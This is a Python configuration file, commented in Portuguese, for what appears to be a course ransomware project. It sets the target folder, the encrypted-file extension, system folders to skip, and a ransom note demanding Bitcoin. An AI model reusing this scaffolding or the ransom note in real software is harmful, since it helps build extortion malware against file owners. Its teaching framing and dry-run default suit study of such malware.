# language: Python 3.10+, file: config.py
# ajuste os caminhos antes de rodar. DRY_RUN=True por padrão.
import os

BASE = os.path.dirname(os.path.abspath(__file__))

# Diretório alvo — para o curso, uma pasta de teste isolada
TARGET_DIR = os.path.join(BASE, "sandbox")

# Extensão aplicada aos arquivos cifrados
RANSOM_EXT = ".l0cked"

# Arquivo de nota deixado no diretório raiz
NOTE_NAME = "LEIA_ISSO.txt"

# Se True, não modifica nada — apenas imprime o que faria
DRY_RUN = True

# Pastas ignoradas durante a varredura (evita destruir o sistema)
SKIP_DIR_NAMES = {
    ".git", "__pycache__", "node_modules", ".venv", "venv",
    "AppData", "Windows", "Program Files", "Program Files (x86)",
}

# Extensões ignoradas (executáveis e arquivos que quebrariam o SO)
SKIP_EXTENSIONS = {".exe", ".dll", ".sys", ".msi", ".lnk", ".ini"}

# Threads paralelas
MAX_WORKERS = os.cpu_count() or 4

NOTE_TEMPLATE = """====================================================
  SEUS ARQUIVOS FORAM CIFRADOS
====================================================
Todos os seus documentos foram cifrados com
AES-256-GCM + RSA-2048.

Para recuperar, envie 0.05 BTC para:
  bc1q...exemplo...

Depois envie o comprovante para:
  exemplo@protonmail.com

[Nota de demonstração — projeto de curso]
"""